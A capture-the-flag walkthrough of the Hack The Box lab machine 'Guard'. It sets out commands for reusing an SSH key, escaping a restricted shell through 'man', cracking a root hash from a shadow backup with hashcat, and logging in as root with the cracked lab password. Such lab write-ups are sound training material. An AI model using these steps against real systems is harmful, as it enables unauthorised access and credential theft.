Hack The Box :: Starting Point :: Guard :: Linux

# Enumeration

We begin by running an Nmap scan.

nmap -A -v 10.10.10.50

The scan reveals that only port 22 is open. Let's try to use the SSH key found in the previous machine to login as daniel (the previous user).

ssh -i id_rsa daniel@10.10.10.50

# Foothold

The SSH login gives us access to a restricted shell, where the commands like find, cat and python are disabled. We cannot read **user.txt** and are unable to enumerate the system properly. This means we will have to to escape the restricted shell. Fortunately, the **man** command can be used to spawn a bash shell.

man man

Once the command opens the manual, we can enter the following command to spawn a bash shell.

!bash
The user flag is located in /home/daniel.

# Privilege Escalation

On enumerating the system, we find a readable shadow backup in /var/backups. Let's try to crack the root hash with hashcat.

$6$KIP2PX8O$7VF4mj1i.w/.sIOwyeN6LKnmeaFTgAGZtjBjRbvX4pEHvx1XUzXLTBBu0jRLPeZS.69qNrPgHJ0yvc3N82hY31

Copy the root hash into a text file and use the following command to crack it.

hashcat -m 1800 --force hash.txt rockyou.txt
After it succeeds, use the following command to show the cracked password.

hashcat -m 1800 --force hash.txt rockyou.txt --show

This reveals the root password to be password#1, which can be used to su to root.

su root
Password: password#1
However, we get a system error. Instead, we can SSH into the machine as root.

ssh root@10.10.10.50
Password: password#1
The root flag is located in /root.